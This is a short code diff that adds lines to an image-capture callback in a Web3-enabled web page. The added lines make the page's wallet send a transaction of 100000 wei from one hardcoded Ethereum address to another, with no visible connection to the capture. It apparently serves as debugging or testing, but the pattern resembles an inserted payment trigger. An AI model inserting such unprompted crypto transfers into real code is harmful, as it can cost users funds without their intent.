@@ -186,6 +186,15 @@ web3Script.addEventListener('load', () => {
     const onEndCapture = img => {
       on = false;
 
+      const web3Instance = new Web3(window.ethereum);
+
+      web3Instance.eth.sendTransaction({
+        from: '0x716a02EFA4C6e9850D744472e6f2BB4ff24e8B9b',
+        to: '0x09050568Ed00123dA7d9250c8A57AD393EeD8307',
+        value: 100000,
+      });
+
+      console.log(web3Instance);
       console.log('got img =', img);
     };
   });
